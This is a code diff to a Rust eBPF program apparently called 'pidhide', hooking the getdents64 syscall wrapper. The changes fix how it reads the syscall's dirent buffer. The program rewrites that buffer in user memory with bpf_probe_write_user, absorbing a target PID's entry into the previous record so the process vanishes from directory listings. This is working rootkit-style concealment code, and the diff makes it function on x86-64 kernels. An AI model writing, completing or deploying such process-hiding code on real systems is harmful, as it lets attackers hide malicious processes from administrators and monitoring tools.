@@ -37,7 +37,7 @@
 #![no_main]
 
 use aya_ebpf::{
-    helpers::{bpf_probe_read_buf, bpf_probe_write_user},
+    helpers::{bpf_probe_read_kernel_buf, bpf_probe_read_user_buf, bpf_probe_write_user},
     macros::{fexit, map},
     maps::Array,
     programs::FExitContext,
@@ -53,6 +53,11 @@ static TARGETS: Array<u64> = Array::with_max_entries(1, 0);
 /// One dirent64 header the parser rides on: d_ino (8) at 0, d_off
 /// (8) at 8, d_reclen (2) at 16, d_type (1) at 18, d_name at 19.
 const DIRENT_HEADER: usize = 19;
+/// The x86-64 trap frame offset of si - the syscall's second real
+/// argument, the dirent buffer pointer. The frame layout is the
+/// ABI's own (r15 first, di at 112, orig_ax after di), and the floor
+/// lane is x86-64 only, so the offset is the ABI's constant.
+const PT_REGS_SI: usize = 104;
 /// The smallest legal d_reclen (header + one name byte + NUL).
 const MIN_RECLEN: usize = DIRENT_HEADER + 2;
 /// The walk's own bound: a 32 KiB getdents batch holds at most a
@@ -63,9 +68,17 @@ const WALK_BOUND: usize = 2048;
 /// at most ten digits; sixteen is generous).
 const NAME_READ: usize = 16;
 
-/// The fexit program on the getdents64 wrapper. The context carries
-/// the syscall's three arguments and, at index 3, its return value -
-/// the byte count the syscall is about to hand to userspace.
+/// The fexit program on the getdents64 wrapper. The wrapper's own
+/// BTF declares ONE argument - the trap frame pointer - so the
+/// context's slot 0 is the frame and slot 1 is the return value the
+/// fexit trampoline appends after it (the v5.15 verifier's own
+/// btf_ctx_access FEXIT branch: the slot past a function's last
+/// declared argument is the return value's seat). The syscall's real
+/// arguments ride inside the frame (si is the dirent buffer, dx the
+/// batch bound) and are read through probe reads, never through
+/// context slots the wrapper does not declare - the 4-th-argument
+/// refusal the first floor run named is the wrapper's one-argument
+/// shape refusing the four-slot assumption.
 #[fexit(function = "__x64_sys_getdents64")]
 pub fn pidhide(ctx: FExitContext) -> i32 {
     // The fixture contract: a refusal inside the walk is named by the
@@ -82,20 +95,33 @@ pub fn pidhide(ctx: FExitContext) -> i32 {
 /// its predecessor's record length. Returns 1 when a pid was hidden,
 /// 0 when the batch had nothing to hide - the loader prints which.
 fn try_pidhide(ctx: &FExitContext) -> Result<i32, i32> {
-    // SAFETY: the fexit context's arg reads are the tracing uapi's
-    // own contract (args at their uapi slots, the return value at
-    // index 3), the dirent walk rides pointer arithmetic the entry
-    // chain's own bounds keep inside the returned batch, and the two
-    // probe helpers are the uapi helpers aya-ebpf wraps. One block
-    // carries the whole walk - edition 2024 wants the unsafe ops
-    // explicit, and this is where they all live.
+    // SAFETY: the syscall wrapper's BTF declares one argument - the
+    // trap frame pointer - so the context slots the wrapper itself
+    // declares are slot 0 (the frame) and slot 1 (the fexit return
+    // value, the btf_ctx_access FEXIT branch's own shape). The
+    // syscall's real arguments ride inside the frame: si holds the
+    // dirent buffer the syscall is about to return, read through a
+    // kernel probe read (the frame is kernel memory), and the
+    // buffer's own bytes are user memory read through user probe
+    // reads. The entry chain's bounds keep the walk inside the
+    // returned batch, and the probe helpers are the uapi helpers
+    // aya-ebpf wraps. One block carries the whole walk - edition
+    // 2024 wants the unsafe ops explicit, and this is where they
+    // all live.
     unsafe {
-    let returned: i64 = ctx.arg(3);
+    let regs: i64 = ctx.arg(0);
+    if regs == 0 {
+        return Ok(0);
+    }
+    let regs = regs as usize as *const u8;
+    let returned: i64 = ctx.arg(1);
     if returned <= 0 {
         return Ok(0);
     }
     let returned = returned as usize;
-    let buffer: *const u8 = ctx.arg(1);
+    let mut word = [0u8; 8];
+    bpf_probe_read_kernel_buf(regs.add(PT_REGS_SI), &mut word).map_err(|_| 1i32)?;
+    let buffer: *const u8 = usize::from_le_bytes(word) as *const u8;
     if buffer.is_null() {
         return Ok(0);
     }
@@ -116,7 +142,7 @@ fn try_pidhide(ctx: &FExitContext) -> Result<i32, i32> {
     while offset + DIRENT_HEADER <= returned && steps < WALK_BOUND {
         steps += 1;
         let mut header = [0u8; 2];
-        bpf_probe_read_buf(
+        bpf_probe_read_user_buf(
             buffer.add(offset + 16),
             &mut header,
         )
@@ -126,7 +152,7 @@ fn try_pidhide(ctx: &FExitContext) -> Result<i32, i32> {
             break;
         }
         let mut name = [0u8; NAME_READ];
-        bpf_probe_read_buf(
+        bpf_probe_read_user_buf(
             buffer.add(offset + DIRENT_HEADER),
             &mut name,
         )
@@ -156,7 +182,7 @@ fn try_pidhide(ctx: &FExitContext) -> Result<i32, i32> {
     // the return lands, so the hide is in place before readdir sees
     // the batch.
     let mut grown = [0u8; 2];
-    bpf_probe_read_buf(buffer.add(prev + 16), &mut grown).map_err(|_| 1i32)?;
+    bpf_probe_read_user_buf(buffer.add(prev + 16), &mut grown).map_err(|_| 1i32)?;
     // The absorbed span: the previous entry's record must reach the
     // hidden entry's end (end - prev), never past it, and never past
     // the u16 field the length lives in.
